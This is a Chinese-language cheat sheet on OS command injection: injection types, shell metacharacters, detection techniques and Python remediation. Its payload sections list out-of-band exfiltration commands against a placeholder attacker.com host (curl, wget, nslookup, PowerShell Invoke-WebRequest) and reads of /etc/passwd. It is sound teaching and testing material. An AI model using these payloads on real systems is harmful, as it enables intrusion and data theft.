# Command Injection (OS Command Injection) — Detection & Exploitation

> 来源: Shannon OSS + OWASP Top 10 (2021) A03

## 漏洞概述

命令注入发生在应用将用户输入传递给系统 shell 时，攻击者可以注入额外的
命令。典型的危险函数包括 `system()`, `exec()`, `popen()`, `os.system()`,
`subprocess.call(shell=True)` 等。

## 注入分类 (Shannon 分类法)

### Slot 类型
- **CMD-argument**: 输入作为命令的独立参数 (如 `ping {input}`)
- **CMD-part-of-string**: 输入嵌入在参数字符串中 (如 `find /var/log -name '*.{input}'`)

### 注入类型
- **直接注入**: 输出反射在响应中
- **盲注 (Blind)**: 无输出，需时序/外带检测
- **栈式命令**: `;`, `|`, `&`, `&&`, `||`, `\n` 连接多命令
- **命令替换**: `` `cmd` `` 或 `$(cmd)`

## Shell 元字符 (Shannon payload)

```
命令分隔符:  ; | || && &
命令替换:    `id`  $(whoami)
管道:        | grep root
换行注入:    %0a / \n
重定向:      > /tmp/out  < /etc/passwd
盲注/外带:   sleep 5  |  ping -c 3 attacker.com  |  curl attacker.com?d=$(whoami)
```

## 常见注入点

- 系统工具调用: ping, traceroute, nslookup, dig
- 文件操作: zip, unzip, tar, convert (ImageMagick)
- 邮件发送: sendmail, mail
- 系统命令: shutdown, reboot, service restart
- 数据库备份: mysqldump, pg_dump
- 日志读取: tail, grep, cat

## 检测方法

### 1. 响应内容检测
查找命令输出的特征字符串:
```
Linux:   uid=, gid=, root:x:0:0, /bin/bash, drwx, -rw, total
Windows: Windows, Program Files, [fonts], Users\
```

### 2. 错误信息检测
```
sh: command not found
bash: syntax error
command not recognized
Segmentation fault
```

### 3. 时序检测 (盲注)
```
; sleep 5       → 响应延迟 ≥ 5s
`timeout 5 ping -c 1 127.0.0.1` → 响应延迟 ≥ 5s
```

### 4. 外带检测 (盲注)
```
; curl http://attacker.com?d=$(whoami)
; wget -qO- http://attacker.com/cmd
| nslookup $(hostname).attacker.com
```

## Windows 特别注意

```cmd
; dir C:\
& type C:\windows\win.ini
| findstr /i admin
&& whoami
|| ver
```

PowerShell:
```powershell
; powershell -c "Get-Process"
; powershell Invoke-WebRequest -Uri http://attacker.com/d
```

## 安全数组 (防御) vs 不安全字符串 (危险)

```python
# ❌ 危险 — shell=True 字符串模式
import subprocess
subprocess.call(f"ping -c 1 {user_input}", shell=True)

# ✅ 安全 — 参数数组 + shell=False
subprocess.call(["ping", "-c", "1", user_input])

# ❌ 危险
import os
os.system(f"nslookup {user_input}")

# ✅ 安全
import subprocess
subprocess.run(["nslookup", user_input], capture_output=True)
```

## 修复方案

```python
# 方案 1: 白名单验证
ALLOWED_HOSTS = {"google.com", "cloudflare.com", "example.com"}
if user_input not in ALLOWED_HOSTS:
    raise ValueError("invalid host")

# 方案 2: shlex.quote() (仅在绝对必要时)
import shlex
safe_arg = shlex.quote(user_input)

# 方案 3: 避免 shell=True
import subprocess
subprocess.run(["ping", "-c", "1", user_input], capture_output=True)
```

## 参考 CVE

- CVE-2021-44228: Log4Shell (JNDI 注入 → 命令执行)
- CVE-2022-22965: Spring4Shell (表达式注入 → RCE)
- CVE-2023-28342: Netgear RAX30 命令注入
